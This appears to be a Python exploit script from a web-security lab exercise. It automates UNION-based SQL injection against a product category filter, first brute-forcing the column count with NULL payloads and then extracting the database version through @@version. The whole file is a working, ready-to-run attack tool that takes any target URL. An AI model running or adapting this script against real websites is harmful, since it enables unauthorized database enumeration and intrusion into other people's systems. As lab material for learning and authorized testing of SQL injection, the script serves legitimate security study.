import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {"http": "http:127.0.0.1:8080", "https": "https:127.0.0.1:8080"}

PATH = "/filter?category=Gifts"

def get_columns(url):
    for i in range(1,51):
        print (f"[+] Testing column count: {i}")
        nulls = ",".join(["NULL"] * i)
        sqli_payload = f"' UNION SELECT {nulls}-- -"
        r = requests.get(url + PATH + sqli_payload, verify = False)
        if "Internal Server Error" not in r.text:
            return i
    return False


def get_version(url, col_num):
    for i in range(col_num):
        print(f"[+] Testing column {i + 1}")
        payload_list = ["NULL"] * col_num
        payload_list[i] = "@@version"
        payload = ",".join(payload_list)
        sqli_payload = f"' UNION SELECT {payload}-- -"
        r = requests.get(url + PATH + sqli_payload, verify = False)
        res = r.text
        if "ubuntu" in res.lower():
            print("[+]DB version recovered")
            soup = BeautifulSoup(r.text, 'html.parser')
            for th in soup.find_all("th"):
                if "ubuntu" in th.text.lower():
                    version = th.text
                    print("[+] The DB version is: '%s'" % version)
                    return version
    return None    


    
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()

    col_num = get_columns(url)
    if col_num:
        print("[+] The number of columns is: "+ str(col_num))

    else:
        print("[-] The SQLi was unsuccessful")            
extracted_version = get_version(url, col_num)